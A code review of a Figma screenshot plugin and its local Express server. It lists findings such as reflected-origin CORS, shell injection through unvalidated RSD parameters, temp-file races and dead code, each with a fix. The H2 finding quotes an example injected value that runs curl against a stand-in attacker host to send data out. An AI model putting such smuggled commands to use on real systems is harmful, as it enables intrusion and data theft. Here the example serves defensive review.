# Mobile Screenshotter — Code Review

Independent expert review of the Figma plugin and local Express server. The code is small and focused, with obvious care taken over the happy path. Most findings below are around trust boundaries (the server is reachable by anything on `localhost`), error paths, and a handful of dead or incorrect bits that have accumulated.

A prior `OPUS_REVIEW.md` exists in the tree; where this review overlaps, the verdict column notes it. Where it disagrees (e.g. the `allowedDomains: ["none"]` claim), this document takes the opposing position.

---

## High priority — bugs and security

### H1. Any local webpage can drive the user's phone
**File:** `server/server.js:135-138`

```js
app.use(cors({
  exposedHeaders: ['X-Resolution']
}));
```

`cors()` with no `origin` option reflects any origin. The server binds to all interfaces implicitly (`app.listen(PORT, ...)`), and any website the user has open can `fetch('http://localhost:3000/screenshot')` and exfiltrate a live screenshot of the paired phone. A malicious ad iframe on any tab is enough.

**Fix:** restrict origin to the Figma plugin sandbox (`null` origin) and/or bind the server to `127.0.0.1` explicitly:

```js
app.use(cors({ origin: false, exposedHeaders: ['X-Resolution'] }));
app.listen(PORT, '127.0.0.1', ...);
```

Note the plugin iframe's `Origin` header is `null`, so a custom origin check is needed rather than a literal allowlist.

---

### H2. Command injection via RSD params
**File:** `server/server.js:207-215`

```js
return `${baseCommand} --rsd ${rsd.address} ${rsd.port}`;
```

`rsd.address` and `rsd.port` come from `process.env`, `--rsd` CLI arg, or an interactive prompt — none of which are validated. A value like `fd17::1; curl http://attacker/$(whoami)` is shelled out by `execAsync`. This is low-impact on a single-user dev machine but is still a shell-injection bug that the code explicitly sets up.

**Fix:** switch the screenshot invocation to `execFile` with an argument array, or validate `address` against an IPv4/IPv6/hostname regex and `port` against `^\d{1,5}$`.

---

### H3. Shared temp file — concurrent requests clobber each other
**File:** `server/server.js:310, 320`

```js
const tempFile = path.join(__dirname, 'temp_screenshot.png');
...
await execAsync(`adb exec-out screencap -p > "${tempFile}"`, ...);
```

Every request writes to the same path. Two overlapping requests (e.g. double-click, or two plugin instances) produce a corrupted PNG or a unlinked-before-read race.

**Fix:** `path.join(os.tmpdir(), \`screenshot-${crypto.randomUUID()}.png\`)` per request, and clean up in a `finally`.

---

### H4. iOS landscape is silently wrong
**File:** `server/server.js:285-295`

iOS always reports `rotation: 0, isLandscape: false`. If the user rotates the device, the captured PNG comes back rotated but the frame in Figma is created with portrait dimensions — producing a stretched/squished image.

**Fix:** `image-size` is already installed (see L3). After capture, read the actual PNG dimensions and swap width/height if they don't match the known `iPhoneSpecs` portrait orientation.

---

## Medium priority — correctness and robustness

### M1. Device detection runs once at startup — no reconnect path
**Files:** `server/server.js:141-187, 222-273`

`detectAndStoreDevice()` is called exactly once in `promptForIOSConfig()`. If the user unplugs and replugs, or starts the server before plugging in, the "Check Connection" button hits `/device` which only reads the cached result. User has to restart the server.

**Fix:** if `connectedDevice.connected === false` when `/device` is called, re-run detection inline; or expose a `/reconnect` endpoint wired to the UI's re-check button.

---

### M2. No timeouts on any `execAsync` call
**File:** `server/server.js` (all `execAsync` sites)

None of the ADB / pymobiledevice3 invocations pass a `timeout`. A hung phone or a stuck tunnel blocks the request for as long as the OS will let it. The UI has a 10s client-side timeout but the server request continues in the background.

**Fix:** `execAsync(cmd, { timeout: 15000 })` on fast calls, `{ timeout: 30000 }` on screenshot capture.

---

### M3. Android rotation parsing is fragile
**File:** `server/server.js:99-110`

```js
const rotationMatch = rotationOutput.match(/ROTATION_(\d+)/);
if (rotationMatch) {
  rotation = parseInt(rotationMatch[1]) / 90;
}
```

`dumpsys window | grep mCurrentRotation` varies by Android version. On stock AOSP you usually get `mCurrentRotation=ROTATION_0`, which matches and gives `0/90 = 0` — a valid enum by accident. For landscape you get `ROTATION_1` or `ROTATION_3` and the code computes `0.011` / `0.033`, never triggering the landscape swap a few lines later.

**Fix:** interpret the captured number correctly — if `< 4` treat as the `Surface.ROTATION_*` enum; otherwise treat as degrees.

```js
const raw = parseInt(rotationMatch[1], 10);
rotation = raw < 4 ? raw : raw / 90;
```

Also missing the radix argument on the `parseInt` call.

---

### M4. iPhone 16 family is missing from `iPhoneSpecs`
**File:** `server/server.js:45-60`

Map stops at iPhone 15 series. A user with an iPhone 16, 16 Plus, 16 Pro, 16 Pro Max, or 16e falls through to the fallback clause in `getIOSResolution()`, which returns iPhone 15 Pro specs. This silently produces wrong frame dimensions for a large share of current devices.

**Fix:** extend the map with `iPhone17,*` entries. Minimum:

```
iPhone17,1  iPhone 16 Pro       1206x2622  scale 3
iPhone17,2  iPhone 16 Pro Max   1320x2868  scale 3
iPhone17,3  iPhone 16           1179x2556  scale 3
iPhone17,4  iPhone 16 Plus      1290x2796  scale 3
iPhone17,5  iPhone 16e          1170x2532  scale 3
```

(Verify against current Apple/Prosser specs before committing.)

---

### M5. `Array.from(bytes)` on the hot path
**File:** `ui.html:326`

```js
imageData: Array.from(bytes),
```

Converts a multi-MB `Uint8Array` to a regular JS array before `postMessage`. For a 3 MB screenshot, this balloons to ~24 MB of boxed numbers and is measurably slower than passing the typed array directly. Figma's plugin `postMessage` supports transferable/structured-cloneable objects including `Uint8Array`.

**Fix:** pass `bytes` directly; accept it as `Uint8Array` (or `ArrayBuffer`) on the `code.ts` side. Keep a `Array.isArray(msg.imageData) ? new Uint8Array(msg.imageData) : msg.imageData` shim if you want belt-and-braces for the first deploy.

---

### M6. `getSizeAsync()` result is only used for a log line
**File:** `code.ts:48-49`

```ts
const { width: physicalWidth, height: physicalHeight } = await image.getSizeAsync();
console.log(`[FIGMA] getSizeAsync: ... (${physicalWidth}x${physicalHeight})`);
```

The frame dimensions come from `resolutionData`, not from the image. The `await` on `getSizeAsync()` is pure overhead (and a blocked microtask) on every capture.

**Fix:** delete the call, or move it behind a debug flag (see L5).

---

### M7. Dead branch — JPEG conversion is commented out
**File:** `server/server.js:311, 341-395`

`finalFile` is declared with the intent of switching between PNG and JPEG paths, but the conversion block is commented out, so `finalFile === tempFile` always. The cleanup check `if (finalFile !== tempFile && fs.existsSync(finalFile))` at line 393 is unreachable, and `sharp` is imported but never invoked (see L1).

**Fix:** either reinstate the JPEG path behind a flag, or remove `finalFile`, the dead branch, and the `sharp` import/dependency entirely.

---

### M8. Client discards the server's error message
**File:** `ui.html:297-299`

```js
if (!response.ok) {
  throw new Error('Screenshot request failed');
}
```

Server sends JSON `{ error, message }` on 4xx/5xx but the client reports a generic string. Users debugging "tunnel not running" or "no device connected" see the useless message.

**Fix:**

```js
if (!response.ok) {
  const body = await response.json().catch(() => null);
  throw new Error(body?.message || body?.error || `HTTP ${response.status}`);
}
```

---

### M9. No graceful handling when ADB or pymobiledevice3 is absent
**File:** `server/server.js:141-187`

Both detection branches swallow *any* error from the child process (including `ENOENT`). Result: "No device found", even if the actual problem is that the binary isn't installed. The troubleshooting section in the README covers this, but the server could just say so.

**Fix:** distinguish `err.code === 'ENOENT'` and log a one-liner telling the user the tool is missing.

---

### M10. Null-access risk on `connectedDevice.info`
**File:** `server/server.js:261-272, 286-295, 362-371`

The code checks `connectedDevice.type === 'ios'` but then accesses `connectedDevice.info.ProductType` etc. Today `info` is always set alongside `type === 'ios'`, so this is safe by construction, but there's no guard and a future regression in `detectAndStoreDevice()` would produce a 500 rather than a 400.

**Fix:** `if (connectedDevice.type === 'ios' && connectedDevice.info) { ... }` in the three call sites, or assert once at the top.

---

## Low priority — cleanup

### L1. `sharp` is installed but unused
**File:** `server/server.js:8`, `server/package.json:13`

Native binary, ~30 MB install footprint. The only usage is inside the commented-out JPEG block.

**Fix:** drop the dependency and the import.

---

### L2. `image-size` is listed in `package.json` but never imported
**File:** `server/package.json:12`

Dead dependency. Could be put to work solving M4 (iOS landscape detection) instead of removed.

---

### L3. `server.js.backup` in the working tree
Untracked backup file left over from a prior edit. Clutter; not ignored, not in source control. Delete or move out of the project root.

---

### L4. `X-Resolution` header parse has no safety net
**File:** `ui.html:302-310`

`JSON.parse(resolutionHeader)` will throw on malformed input and drop through to the outer catch, which reports "Failed to take screenshot: Unexpected token…" — not useful. The code already has a fallback to `/resolution`; wrap the parse in try/catch so that fallback is actually reachable.

---

### L5. Instrumentation noise in production
**Files:** `code.ts`, `ui.html`

Roughly half the lines in the plugin are `start = Date.now(); console.log(...)` pairs. Helpful during the optimization round but now permanent clutter. Gate behind a `DEBUG` flag:

```ts
const DEBUG = false;
const tick = (label: string, t0: number) => DEBUG && console.log(`[${label}] ${Date.now() - t0}ms`);
```

---

### L6. Signal handling around `sudo` child process
**File:** `server/server.js:474-484`

```js
process.on('SIGINT',  () => { cleanupTunnel(); process.exit(0); });
```

`cleanupTunnel()` sends `SIGTERM` to `sudo`, which usually forwards to the tunnel child but not always (depends on whether `sudo` is still in the password-prompt phase). A double Ctrl-C during setup can orphan the `pymobiledevice3` child. Low impact on a dev tool but worth sending `SIGINT` (matching what Ctrl-C would do interactively) and giving a short grace window before `exit`.

---

### L7. `ResolutionData` interface drops rotation fields
**File:** `code.ts:4-9`

Server returns `rotation`, `isLandscape`, `density` but the plugin-side interface omits them. Harmless today (plugin doesn't use them) but will mislead the next person extending this.

---

### L8. Manifest `allowedDomains: ["none"]` is **correct** — flagged incorrectly elsewhere
**File:** `manifest.json:14`

The previous review (`OPUS_REVIEW.md` finding #11) claims `["none"]` is a misreading of the manifest schema. It isn't — Figma's plugin manifest explicitly defines `"none"` as the sentinel meaning "no production network access." `[]` (empty array) actually means *no restriction* in some past revisions of the schema. Leave this as is.

---

### L9. `SERVER_URL` hardcoded in `ui.html`
**File:** `ui.html:148`

If someone needs to run the server on a different port, they have to hand-edit the plugin. Low priority because this tool is intentionally single-user. Worth calling out if a multi-device workflow becomes a goal.

---

### L10. Missing `package.json` metadata
**File:** `package.json:12-13`

`"author": ""`, `"license": ""`. Harmless but the defaults look unfinished. `"license": "MIT"` or `"UNLICENSED"` is more honest.

---

## Summary

| Pri | # | Finding | Location |
|-----|---|---------|----------|
| **H** | H1 | CORS reflects any origin → drive-by screenshot | `server.js:135` |
| **H** | H2 | Shell injection via RSD args | `server.js:207-215` |
| **H** | H3 | Shared temp file — race between concurrent captures | `server.js:310-320` |
| **H** | H4 | iOS landscape silently wrong | `server.js:285-295` |
| **M** | M1 | No reconnect path after device unplug | `server.js:141-187` |
| **M** | M2 | No timeouts on any device command | `server.js` (all `execAsync`) |
| **M** | M3 | Android rotation parser mishandles enum form | `server.js:99-110` |
| **M** | M4 | iPhone 16 family missing from spec map | `server.js:45-60` |
| **M** | M5 | `Array.from(bytes)` unnecessary for postMessage | `ui.html:326` |
| **M** | M6 | `getSizeAsync()` result only logged | `code.ts:48` |
| **M** | M7 | Dead `finalFile` branch from commented-out JPEG path | `server.js:311,393` |
| **M** | M8 | Client throws generic error, discards server message | `ui.html:297` |
| **M** | M9 | ADB/pymd3 missing looks like "no device" | `server.js:141-187` |
| **M** | M10 | Implicit assumption `info` non-null when `type==='ios'` | `server.js:261-295` |
| **L** | L1 | `sharp` imported/installed but unused | `server.js:8` |
| **L** | L2 | `image-size` dependency unused | `server/package.json:12` |
| **L** | L3 | `server.js.backup` in working tree | repo root |
| **L** | L4 | `X-Resolution` `JSON.parse` can throw | `ui.html:303` |
| **L** | L5 | Excess perf logging should be DEBUG-gated | `code.ts`, `ui.html` |
| **L** | L6 | `sudo`/tunnel signal handling brittle | `server.js:474-484` |
| **L** | L7 | `ResolutionData` interface missing fields | `code.ts:4-9` |
| **L** | L8 | **Correction:** `allowedDomains: ["none"]` is correct | `manifest.json:14` |
| **L** | L9 | `SERVER_URL` hardcoded | `ui.html:148` |
| **L** | L10 | Empty author/license fields | `package.json:12-13` |

### Recommended first PRs

1. **H1 + M2** together — bind to `127.0.0.1`, origin-restrict CORS, add timeouts. One small PR, big security + reliability win.
2. **H3 + M7 + L1** — unique temp files, remove dead JPEG/`sharp` plumbing in the same change.
3. **M5 + M6 + L5** — plugin-side cleanup pass that measurably speeds up capture and drops ~40 lines of logging.
4. **M4** — low effort, fixes wrong frames for anyone on a current iPhone.
